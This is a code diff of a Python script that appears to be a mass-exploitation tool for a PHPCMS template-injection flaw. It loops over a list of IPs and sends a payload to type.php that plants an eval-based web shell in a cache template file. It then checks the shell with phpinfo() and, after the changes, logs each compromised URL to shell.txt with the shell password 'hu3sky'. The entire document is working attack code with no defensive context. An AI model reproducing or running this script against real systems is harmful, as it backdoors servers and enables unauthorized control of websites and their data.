@@ -7,15 +7,16 @@
 import requests
 import time
 import base64
+import time
 
 #-------------------
-path = "/type.php"
+path = "type.php"
 payload = "template=tag_(){};eval($_POST[hu3sky]);{//../rss"
-shell_path = "/data/cache_template/rss.tpl.php"
+shell_path = "data/cache_template/rss.tpl.php"
 data={"hu3sky":"phpinfo();"}
 #-------------------
 
-f1 = open('url.txt','r')
+f1 = open('ip_list.txt','r')
 
 def phpcms_exp():
 	for line in f1.readlines():
@@ -24,12 +25,15 @@ def phpcms_exp():
 		print("[+]url: "+url1)
 		try:
 			# 生成缓存模板文件的小马
-			target1 = requests.get(url1,params=payload)
+			target1 = requests.get(url1,params=payload,timeout=3)
 			final_shell = line+shell_path
 			# 访问小马,检测是否生成成功
-			target2 = requests.post(final_shell,data=data)
+			target2 = requests.post(final_shell,data=data,timeout=3)
 			if target2.status_code == 200:
-				print("[+]Successfully!The shell is"+target2.url)
+				with open("shell.txt","a") as f:
+					f.write(target2.url+"\n")
+					f.close()
+				print("[+]Successfully!The shell is "+target2.url)
 				print("[+]The pass is hu3sky")
 			else:
 				print("[-]Maybe "+line+" didnt has the vuln")
